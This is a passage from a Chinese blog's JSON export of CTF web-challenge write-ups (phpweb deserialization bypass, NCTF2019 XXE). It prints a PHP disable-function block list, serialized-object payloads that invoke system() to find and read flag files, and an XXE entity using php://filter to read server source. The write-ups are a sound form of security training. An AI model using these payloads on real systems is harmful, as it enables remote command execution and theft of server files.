punctuation\">,</span><span class=\"token string double-quoted-string\">\"touch\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"escapeshellcmd\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"escapeshellarg\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"assert\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"substr_replace\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"call_user_func_array\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"call_user_func\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"array_filter\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"array_walk\"</span><span class=\"token punctuation\">,</span>  <span class=\"token string double-quoted-string\">\"array_map\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"registregister_shutdown_function\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"register_tick_function\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"filter_var\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"filter_var_array\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"uasort\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"uksort\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"array_reduce\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"array_walk\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"array_walk_recursive\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"pcntl_exec\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"fopen\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"fwrite\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"file_put_contents\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">function</span> <span class=\"token function\">gettime</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token variable\">$a</span><span class=\"token operator\">=</span> <span class=\"token function\">gettype</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"string\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">var</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"Y-m-d h:i:s a\"</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">var</span> <span class=\"token variable\">$func</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"date\"</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token keyword\">echo</span> <span class=\"token function\">gettime</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token variable\">$func</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"func\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"p\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token variable\">$func</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$disable_fun</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">echo</span> <span class=\"token function\">gettime</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Hacker...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里首先，它过滤了大量的函数，所以很多函数都用不了了，并且他会对函数执行结果进行判断，只有是字符才能输出，所以一开始用scandir()去读目录是没有回复显示的。还有一个重要的点就是它其实是存在一个Test类，而这个Test类是会调用gettime函数的。而在diasble_func里也没有反序列化函数，所以我们可以利用反序列化来做这题。因为他只会吧func的内容和disable_func去做对比。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'cat+/tmp/flagoefiu4r93'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">var</span> <span class=\"token variable\">$func</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"system\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span> <span class=\"token operator\">!=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token function\">gettime</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">func</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>web根目录下并没有flag相关文件，合理利用Linux命令find来查找</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:27:&quot;find+&#x2F;+-name+&quot;flag*&quot;+-print&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://i.loli.net/2020/11/15/mkN7IZARolzQeXO.png\" alt=\"image-20201115185643416\"></p>\n<p>发现在tmp里面</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat+&#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://i.loli.net/2020/11/15/Y9Mjkg4hDCHsVXA.png\" alt=\"image-20201115185936526\"></p>\n<h2 id=\"NCTF2019-Fake-XML-cookbook\"><a href=\"#NCTF2019-Fake-XML-cookbook\" class=\"headerlink\" title=\"[NCTF2019]Fake XML cookbook\"></a>[NCTF2019]Fake XML cookbook</h2><p>考点：xxe</p>\n<p>提交账号密码，发现在username处存在xxe利用点。</p>\n<p>所以直接做xxe，来读取文件，然后刚好在flag处就有了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo@master/img/image-20201115194021975.png\" alt=\"image-20201115194021975\"></p>\n<p>记录一个：读php文件的payload,PHP格式为<code>&lt;?php ?&gt;</code>类似xml格式，导致php被当作xml解析而难以读取其内容，可以使用PHP伪协议来读取文件内容。</p>\n<pre class=\"line-numbers language-xml-dtd\" data-language=\"xml-dtd\"><code class=\"language-xml-dtd\">&lt;!DOCTYPE message [\n    &lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;doLogin.php&quot;&gt;\n]&gt;\n&lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;password&gt;66666&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n","text":"[BJDCTF2020]Mark loves cat考点：git泄露、代码审计、变量覆盖 只发现最下面有一个交互点，这是一个提交留言的交互点的样子，提交试一下，发现会在GET传参message。 但是有一个奇怪的地方，index.html?message=1111111 但是这个...","link":"","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"BUUOJ","slug":"BUUOJ","count":13,"path":"api/tags/BUUOJ.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF2020-Mark-loves-cat\"><span class=\"toc-text\">[BJDCTF2020]Mark loves cat</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%89\"><span class=\"toc-text\">方法三</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93\"><span class=\"toc-text\">[GWCTF 2019]我有一个数据库</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF2020-The-mystery-of-ip\"><span class=\"toc-text\">[BJDCTF2020]The mystery of ip</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4\"><span class=\"toc-text\">[BJDCTF2020]ZJCTF，不过如此</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#GKCTF2020-CheckIN\"><span class=\"toc-text\">[GKCTF2020]CheckIN</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80\"><span class=\"toc-text\">[BJDCTF 2nd]假猪套天下第一</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SUCTF-2019-Pythonginx\"><span class=\"toc-text\">[SUCTF 2019]Pythonginx</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb\"><span class=\"toc-text\">[网鼎杯 2020 朱雀组]phpweb</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#NCTF2019-Fake-XML-cookbook\"><span class=\"toc-text\">[NCTF2019]Fake XML cookbook</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"RedHat学习(三)","uid":"c1bcca257a4c5447e48fa38583f46a58","slug":"RedHat学习-三","date":"2020-11-10T10:35:20.000Z","updated":"2020-12-26T14:20:01.000Z","comments":true,"path":"api/articles/RedHat学习-三.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"Vim文本编辑器之前也是已经使用过了，这个是个Linux上必备应用，基本上市面上的Linux发行版也都已经内置了这个文本编辑器了。vim编辑器有三种模式，分别是命令模式、末行模式、编辑模式。 命令模式：控制光标移动，可以对文本进行复制、粘贴、删除和查找 输入模式：可以进行文本写入...","link":"","photos":[],"count_time":{"symbolsCount":"5.4k","symbolsTime":"5 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"RedHat学习(二)","uid":"8b3531144a5c5026a6d6f350f14fc7b9","slug":"RedHat学习-二","date":"2020-11-07T11:40:07.000Z","updated":"2020-12-26T14:19:55.000Z","comments":true,"path":"api/articles/RedHat学习-二.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200601211235.jpg","text":"今天继续redhat系列 输入输出重定向输入重定向：把文件导入导命令中来 输出重定向：把输出写入到指定文件 如果是先要结合linux命令来使用，一般是输出重定向起到更多作用。而输出重定向可以分为两种，标准输出重定向和错误输出重定向。而输入重定向，就是标准输入重定向。也就是STDI...","link":"","photos":[],"count_time":{"symbolsCount":"4.4k","symbolsTime":"4 mins."},"categories":[{"name":"Linux学习","slug":"Linux学习","count":7,"path":"api/categories/Linux学习.json"}],"tags":[{"name":"Linux","slug":"Linux","count":11,"path":"api/tags/Linux.json"},{"name":"Redhat","slug":"Redhat","count":5,"path":"api/tags/Redhat.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}